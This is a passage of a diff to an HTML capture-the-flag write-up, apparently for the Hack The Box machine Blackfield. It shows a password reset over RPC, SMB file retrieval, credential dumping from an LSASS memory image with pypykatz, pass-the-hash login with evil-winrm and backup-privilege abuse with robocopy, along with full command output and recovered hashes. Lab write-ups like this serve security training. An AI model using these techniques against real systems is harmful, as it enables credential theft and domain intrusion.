+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rpcclient -U support //10.10.10.192
+</span></span><span style="display:flex;"><span>Enter WORKGROUP<span style="color:#ae81ff">\s</span>upport<span style="color:#e6db74">&#39;s password: #00^BlackKnight
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">rpcclient $&gt; setuserinfo2 audit2020 23 &#39;</span>Password!<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">rpcclient $&gt; exit
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">smbclient -U audit2020 //10.10.10.192/forensic
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Enter WORKGROUP\audit2020&#39;</span>s password: Password!
+</span></span><span style="display:flex;"><span>Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> ls
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Sun Feb <span style="color:#ae81ff">23</span> 14:03:16 <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Sun Feb <span style="color:#ae81ff">23</span> 14:03:16 <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>  commands_output                     D        <span style="color:#ae81ff">0</span>  Sun Feb <span style="color:#ae81ff">23</span> 19:14:37 <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>  memory_analysis                     D        <span style="color:#ae81ff">0</span>  Thu May <span style="color:#ae81ff">28</span> 22:28:33 <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>  tools                               D        <span style="color:#ae81ff">0</span>  Sun Feb <span style="color:#ae81ff">23</span> 14:39:08 <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">7846143</span> blocks of size 4096. <span style="color:#ae81ff">3825653</span> blocks available
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> mget *
+</span></span><span style="display:flex;"><span>NT_STATUS_NO_SUCH_FILE listing <span style="color:#ae81ff">\*</span>
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span>
+</span></span></code></pre></div><ol start="2">
 <li>I tried using <code>smbclient.py</code> from Impacket instead.</li>
 </ol>
-<pre><code>smbclient.py audit2020@10.10.10.192
+<pre tabindex="0"><code>smbclient.py audit2020@10.10.10.192
 Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
 
 Password: Password!
@@ -1203,7 +1194,7 @@ drw-rw-rw-          0  Thu May 28 22:29:24 2020 ..
 <li>From all these files in lsass.zip we need <code>lsass.DMP</code> to <a href="https://medium.com/@ali.bawazeeer/using-mimikatz-to-get-cleartext-password-from-offline-memory-dump-76ed09fd3330">extract password</a> later using <a href="https://github.com/gentilkiwi/mimikatz/releases">mimikatz</a>:</li>
 </ol>
 <p>Because I refuse to use windows I resorted to using <a href="https://github.com/skelsec/pypykatz">pypykatz</a> instead of mimikatz.</p>
-<pre><code>pypykatz lsa minidump lsass.DMP                    
+<pre tabindex="0"><code>pypykatz lsa minidump lsass.DMP                    
 INFO:root:Parsing file lsass.DMP
 FILE: ======== lsass.DMP =======
 == LogonSession ==
@@ -1260,7 +1251,7 @@ luid 365835
 	== Kerberos ==
 		Username: DC01$
 		Domain: BLACKFIELD.local
-		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K'mH:&amp;'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'&lt;Vb0I6
+		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K&#39;mH:&amp;&#39;K^SW$FNWWx7J-N$^&#39;bzB1Duc3^Ez]En kh`b&#39;YSV7Ml#@G3@*(b$]j%#L^[Q`nCP&#39;&lt;Vb0I6
 	== WDIGEST [5950b]==
 		username DC01$
 		domainname BLACKFIELD
@@ -1288,7 +1279,7 @@ luid 365493
 	== Kerberos ==
 		Username: DC01$
 		Domain: BLACKFIELD.local
-		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K'mH:&amp;'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'&lt;Vb0I6
+		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K&#39;mH:&amp;&#39;K^SW$FNWWx7J-N$^&#39;bzB1Duc3^Ez]En kh`b&#39;YSV7Ml#@G3@*(b$]j%#L^[Q`nCP&#39;&lt;Vb0I6
 	== WDIGEST [593b5]==
 		username DC01$
 		domainname BLACKFIELD
@@ -1395,7 +1386,7 @@ luid 40310
 	== Kerberos ==
 		Username: DC01$
 		Domain: BLACKFIELD.local
-		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K'mH:&amp;'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'&lt;Vb0I6
+		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K&#39;mH:&amp;&#39;K^SW$FNWWx7J-N$^&#39;bzB1Duc3^Ez]En kh`b&#39;YSV7Ml#@G3@*(b$]j%#L^[Q`nCP&#39;&lt;Vb0I6
 	== WDIGEST [9d76]==
 		username DC01$
 		domainname BLACKFIELD
@@ -1423,7 +1414,7 @@ luid 40232
 	== Kerberos ==
 		Username: DC01$
 		Domain: BLACKFIELD.local
-		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K'mH:&amp;'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'&lt;Vb0I6
+		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K&#39;mH:&amp;&#39;K^SW$FNWWx7J-N$^&#39;bzB1Duc3^Ez]En kh`b&#39;YSV7Ml#@G3@*(b$]j%#L^[Q`nCP&#39;&lt;Vb0I6
 	== WDIGEST [9d28]==
 		username DC01$
 		domainname BLACKFIELD
@@ -1459,7 +1450,7 @@ luid 996
 	== Kerberos ==
 		Username: dc01$
 		Domain: BLACKFIELD.local
-		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K'mH:&amp;'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'&lt;Vb0I6
+		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K&#39;mH:&amp;&#39;K^SW$FNWWx7J-N$^&#39;bzB1Duc3^Ez]En kh`b&#39;YSV7Ml#@G3@*(b$]j%#L^[Q`nCP&#39;&lt;Vb0I6
 	== WDIGEST [3e4]==
 		username DC01$
 		domainname BLACKFIELD
@@ -1487,7 +1478,7 @@ luid 24410
 	== Kerberos ==
 		Username: DC01$
 		Domain: BLACKFIELD.local
-		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K'mH:&amp;'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'&lt;Vb0I6
+		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K&#39;mH:&amp;&#39;K^SW$FNWWx7J-N$^&#39;bzB1Duc3^Ez]En kh`b&#39;YSV7Ml#@G3@*(b$]j%#L^[Q`nCP&#39;&lt;Vb0I6
 	== WDIGEST [5f5a]==
 		username DC01$
 		domainname BLACKFIELD
@@ -1548,7 +1539,7 @@ luid 366665
 	== Kerberos ==
 		Username: DC01$
 		Domain: BLACKFIELD.local
-		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K'mH:&amp;'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'&lt;Vb0I6
+		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K&#39;mH:&amp;&#39;K^SW$FNWWx7J-N$^&#39;bzB1Duc3^Ez]En kh`b&#39;YSV7Ml#@G3@*(b$]j%#L^[Q`nCP&#39;&lt;Vb0I6
 	== WDIGEST [59849]==
 		username DC01$
 		domainname BLACKFIELD
@@ -1576,7 +1567,7 @@ luid 366649
 	== Kerberos ==
 		Username: DC01$
 		Domain: BLACKFIELD.local
-		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K'mH:&amp;'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'&lt;Vb0I6
+		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K&#39;mH:&amp;&#39;K^SW$FNWWx7J-N$^&#39;bzB1Duc3^Ez]En kh`b&#39;YSV7Ml#@G3@*(b$]j%#L^[Q`nCP&#39;&lt;Vb0I6
 	== WDIGEST [59839]==
 		username DC01$
 		domainname BLACKFIELD
@@ -1676,7 +1667,7 @@ luid 24405
 	== Kerberos ==
 		Username: DC01$
 		Domain: BLACKFIELD.local
-		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K'mH:&amp;'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'&lt;Vb0I6
+		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K&#39;mH:&amp;&#39;K^SW$FNWWx7J-N$^&#39;bzB1Duc3^Ez]En kh`b&#39;YSV7Ml#@G3@*(b$]j%#L^[Q`nCP&#39;&lt;Vb0I6
 	== WDIGEST [5f55]==
 		username DC01$
 		domainname BLACKFIELD
@@ -1704,7 +1695,7 @@ luid 24294
 	== Kerberos ==
 		Username: DC01$
 		Domain: BLACKFIELD.local
-		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K'mH:&amp;'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'&lt;Vb0I6
+		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K&#39;mH:&amp;&#39;K^SW$FNWWx7J-N$^&#39;bzB1Duc3^Ez]En kh`b&#39;YSV7Ml#@G3@*(b$]j%#L^[Q`nCP&#39;&lt;Vb0I6
 	== WDIGEST [5ee6]==
 		username DC01$
 		domainname BLACKFIELD
@@ -1732,7 +1723,7 @@ luid 24282
 	== Kerberos ==
 		Username: DC01$
 		Domain: BLACKFIELD.local
-		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K'mH:&amp;'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'&lt;Vb0I6
+		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K&#39;mH:&amp;&#39;K^SW$FNWWx7J-N$^&#39;bzB1Duc3^Ez]En kh`b&#39;YSV7Ml#@G3@*(b$]j%#L^[Q`nCP&#39;&lt;Vb0I6
 	== WDIGEST [5eda]==
 		username DC01$
 		domainname BLACKFIELD
@@ -1846,7 +1837,7 @@ luid 999
 </code></pre><ol start="4">
 <li>Among many entries there is the one that we can use for remote access:</li>
 </ol>
-<pre><code>== LogonSession ==
+<pre tabindex="0"><code>== LogonSession ==
 authentication_id 406499 (633e3)
 session_id 2
 username svc_backup
@@ -1884,345 +1875,345 @@ and our NTLM hash: <code>9658d1d1dcd9250115e2205d9f48400d</code></p>
 <ol>
 <li>Login with <code>evil-winrm</code>:</li>
 </ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">evil-winrm -H 9658d1d1dcd9250115e2205d9f48400d -u svc_backup -i 10.10.10.192
-
-Evil-WinRM shell v2.3
-
-Info: Establishing connection to remote endpoint
-
-*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; cd ..\Desktop
-*Evil-WinRM* PS C:\Users\svc_backup\Desktop&gt; type user.txt
-d7ace9d9fd5763c94073876caf78f581
-*Evil-WinRM* PS C:\Users\svc_backup\Desktop&gt;
-</code></pre></div><ol start="2">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>evil-winrm -H 9658d1d1dcd9250115e2205d9f48400d -u svc_backup -i 10.10.10.192
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v2.3
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; cd ..\Desktop
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\svc_backup\Desktop&gt; type user.txt
+</span></span><span style="display:flex;"><span>d7ace9d9fd5763c94073876caf78f581
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\svc_backup\Desktop&gt;
+</span></span></code></pre></div><ol start="2">
 <li>Get the user details:</li>
 </ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">*Evil-WinRM* PS C:\Users\svc_backup\Desktop&gt; whoami /all
-
-USER INFORMATION
-----------------
-
-User Name             SID
-===================== ==============================================
-blackfield\svc_backup S-1-5-21-4194615774-2175524697-3563712290-1413
-
-
-GROUP INFORMATION
------------------
-
-Group Name                                 Type             SID          Attributes
-========================================== ================ ============ ==================================================
-Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
-BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
-BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
-BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
-BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
-Mandatory Label\High Mandatory Level       Label            S-1-16-12288
-
-
-PRIVILEGES INFORMATION
-----------------------
-
-Privilege Name                Description                    State
-============================= ============================== =======
-SeMachineAccountPrivilege     Add workstations to domain     Enabled
-SeBackupPrivilege             Back up files and directories  Enabled
-SeRestorePrivilege            Restore files and directories  Enabled
-SeShutdownPrivilege           Shut down the system           Enabled
-SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
-SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
-
-
-USER CLAIMS INFORMATION
------------------------
-
-User claims unknown.
-
-Kerberos support for Dynamic Access Control on this device has been disabled.
-*Evil-WinRM* PS C:\Users\svc_backup\Desktop&gt;
-</code></pre></div><h2 id="privilege-escalation">Privilege escalation</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\svc_backup\Desktop&gt; whoami /all
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>USER INFORMATION
+</span></span><span style="display:flex;"><span>----------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User Name             SID
+</span></span><span style="display:flex;"><span>===================== ==============================================
+</span></span><span style="display:flex;"><span>blackfield\svc_backup S-1-5-21-4194615774-2175524697-3563712290-1413
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GROUP INFORMATION
+</span></span><span style="display:flex;"><span>-----------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Group Name                                 Type             SID          Attributes
+</span></span><span style="display:flex;"><span>========================================== ================ ============ ==================================================
+</span></span><span style="display:flex;"><span>Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>Mandatory Label\High Mandatory Level       Label            S-1-16-12288
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PRIVILEGES INFORMATION
+</span></span><span style="display:flex;"><span>----------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Privilege Name                Description                    State
+</span></span><span style="display:flex;"><span>============================= ============================== =======
+</span></span><span style="display:flex;"><span>SeMachineAccountPrivilege     Add workstations to domain     Enabled
+</span></span><span style="display:flex;"><span>SeBackupPrivilege             Back up files and directories  Enabled
+</span></span><span style="display:flex;"><span>SeRestorePrivilege            Restore files and directories  Enabled
+</span></span><span style="display:flex;"><span>SeShutdownPrivilege           Shut down the system           Enabled
+</span></span><span style="display:flex;"><span>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+</span></span><span style="display:flex;"><span>SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>USER CLAIMS INFORMATION
+</span></span><span style="display:flex;"><span>-----------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User claims unknown.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Kerberos support for Dynamic Access Control on this device has been disabled.
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\svc_backup\Desktop&gt;
+</span></span></code></pre></div><h2 id="privilege-escalation">Privilege escalation</h2>
 <ol>
 <li>Enumerating around I found some notes:</li>
 </ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">*Evil-WinRM* PS C:\&gt; cmd /c dir notes.txt /s
- Volume in drive C has no label.
- Volume Serial Number is 0CB9-3D15
-
- Directory of C:\Documents and Settings\Administrator\Desktop
-
-02/28/2020  05:36 PM               447 notes.txt
-               1 File(s)            447 bytes
-
- Directory of C:\Users\Administrator\Desktop
-
-02/28/2020  05:36 PM               447 notes.txt
-               1 File(s)            447 bytes
-
-     Total Files Listed:
-               2 File(s)            894 bytes
-               0 Dir(s)  14,650,949,632 bytes free
-</code></pre></div><ol start="2">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>*Evil-WinRM* PS C:\&gt; cmd /c dir notes.txt /s
+</span></span><span style="display:flex;"><span> Volume in drive C has no label.
+</span></span><span style="display:flex;"><span> Volume Serial Number is 0CB9-3D15
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Directory of C:\Documents and Settings\Administrator\Desktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>02/28/2020  05:36 PM               447 notes.txt
+</span></span><span style="display:flex;"><span>               1 File(s)            447 bytes
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Directory of C:\Users\Administrator\Desktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>02/28/2020  05:36 PM               447 notes.txt
+</span></span><span style="display:flex;"><span>               1 File(s)            447 bytes
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>     Total Files Listed:
+</span></span><span style="display:flex;"><span>               2 File(s)            894 bytes
+</span></span><span style="display:flex;"><span>               0 Dir(s)  14,650,949,632 bytes free
+</span></span></code></pre></div><ol start="2">
 <li>But trying to read them failed:</li>
 </ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt
-Access to the path &#39;C:\Users\Administrator\Desktop\root.txt&#39; is denied.
-At line:1 char:1
-+ type root.txt
-+ ~~~~~~~~~~~~~
-    + CategoryInfo          : PermissionDenied: (C:\Users\Administrator\Desktop\root.txt:String) [Get-Content], UnauthorizedAccessException
-    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
-*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type notes.txt
-Access to the path &#39;C:\Users\Administrator\Desktop\notes.txt&#39; is denied.
-At line:1 char:1
-+ type notes.txt
-+ ~~~~~~~~~~~~~~
-    + CategoryInfo          : PermissionDenied: (C:\Users\Administrator\Desktop\notes.txt:String) [Get-Content], UnauthorizedAccessException
-    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
-</code></pre></div><ol start="3">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt
+</span></span><span style="display:flex;"><span>Access to the path &#39;C:\Users\Administrator\Desktop\root.txt&#39; is denied.
+</span></span><span style="display:flex;"><span>At line:1 char:1
+</span></span><span style="display:flex;"><span>+ type root.txt
+</span></span><span style="display:flex;"><span>+ ~~~~~~~~~~~~~
+</span></span><span style="display:flex;"><span>    + CategoryInfo          : PermissionDenied: (C:\Users\Administrator\Desktop\root.txt:String) [Get-Content], UnauthorizedAccessException
+</span></span><span style="display:flex;"><span>    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type notes.txt
+</span></span><span style="display:flex;"><span>Access to the path &#39;C:\Users\Administrator\Desktop\notes.txt&#39; is denied.
+</span></span><span style="display:flex;"><span>At line:1 char:1
+</span></span><span style="display:flex;"><span>+ type notes.txt
+</span></span><span style="display:flex;"><span>+ ~~~~~~~~~~~~~~
+</span></span><span style="display:flex;"><span>    + CategoryInfo          : PermissionDenied: (C:\Users\Administrator\Desktop\notes.txt:String) [Get-Content], UnauthorizedAccessException
+</span></span><span style="display:flex;"><span>    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
+</span></span></code></pre></div><ol start="3">
 <li>Because we are in backup group we may try to use <code>robocopy</code> to get files:</li>
 </ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; robocopy C:/Users/Administrator/Desktop/ C:/windows/temp/ /B
-
--------------------------------------------------------------------------------
-   ROBOCOPY     ::     Robust File Copy for Windows
--------------------------------------------------------------------------------
-
-  Started : Wednesday, June 10, 2020 8:42:33 PM
-   Source : C:\Users\Administrator\Desktop\
-     Dest : C:\windows\temp\
-
-    Files : *.*
-
-  Options : *.* /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30
-
-------------------------------------------------------------------------------
-
-	                   3	C:\Users\Administrator\Desktop\
-    *EXTRA Dir        -1	C:\windows\temp\DiagTrack_alternativeTrace\
-    *EXTRA Dir        -1	C:\windows\temp\DiagTrack_aot\
-    *EXTRA Dir        -1	C:\windows\temp\DiagTrack_diag\
-    *EXTRA Dir        -1	C:\windows\temp\DiagTrack_miniTrace\
-    *EXTRA Dir        -1	C:\windows\temp\F6F6D4B4-8749-41BC-9863-051319BFEC08-Sigs\
-    *EXTRA Dir        -1	C:\windows\temp\vmware-SYSTEM\
-	  *EXTRA File 		  134448	MpCmdRun.log
-	  *EXTRA File 		     102	silconfig.log
-	  *EXTRA File 		   57316	vmware-vmsvc.log
-	  *EXTRA File 		   15832	vmware-vmusr.log
-	  *EXTRA File 		    1728	vmware-vmvss.log
-	    New File  		     282	desktop.ini
-  0%
-100%
-	    New File  		     447	notes.txt
-  0%
-100%
-	    New File  		      34	root.txt
-2020/06/10 20:42:33 ERROR 5 (0x00000005) Copying File C:\Users\Administrator\Desktop\root.txt
-Access is denied.
-</code></pre></div><ol start="4">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; robocopy C:/Users/Administrator/Desktop/ C:/windows/temp/ /B
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------------
+</span></span><span style="display:flex;"><span>   ROBOCOPY     ::     Robust File Copy for Windows
+</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  Started : Wednesday, June 10, 2020 8:42:33 PM
+</span></span><span style="display:flex;"><span>   Source : C:\Users\Administrator\Desktop\
+</span></span><span style="display:flex;"><span>     Dest : C:\windows\temp\
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Files : *.*
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  Options : *.* /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>------------------------------------------------------------------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	                   3	C:\Users\Administrator\Desktop\
+</span></span><span style="display:flex;"><span>    *EXTRA Dir        -1	C:\windows\temp\DiagTrack_alternativeTrace\
+</span></span><span style="display:flex;"><span>    *EXTRA Dir        -1	C:\windows\temp\DiagTrack_aot\
+</span></span><span style="display:flex;"><span>    *EXTRA Dir        -1	C:\windows\temp\DiagTrack_diag\
+</span></span><span style="display:flex;"><span>    *EXTRA Dir        -1	C:\windows\temp\DiagTrack_miniTrace\
+</span></span><span style="display:flex;"><span>    *EXTRA Dir        -1	C:\windows\temp\F6F6D4B4-8749-41BC-9863-051319BFEC08-Sigs\
+</span></span><span style="display:flex;"><span>    *EXTRA Dir        -1	C:\windows\temp\vmware-SYSTEM\
+</span></span><span style="display:flex;"><span>	  *EXTRA File 		  134448	MpCmdRun.log
+</span></span><span style="display:flex;"><span>	  *EXTRA File 		     102	silconfig.log
+</span></span><span style="display:flex;"><span>	  *EXTRA File 		   57316	vmware-vmsvc.log
+</span></span><span style="display:flex;"><span>	  *EXTRA File 		   15832	vmware-vmusr.log
+</span></span><span style="display:flex;"><span>	  *EXTRA File 		    1728	vmware-vmvss.log
+</span></span><span style="display:flex;"><span>	    New File  		     282	desktop.ini
+</span></span><span style="display:flex;"><span>  0%
+</span></span><span style="display:flex;"><span>100%
+</span></span><span style="display:flex;"><span>	    New File  		     447	notes.txt
+</span></span><span style="display:flex;"><span>  0%
+</span></span><span style="display:flex;"><span>100%
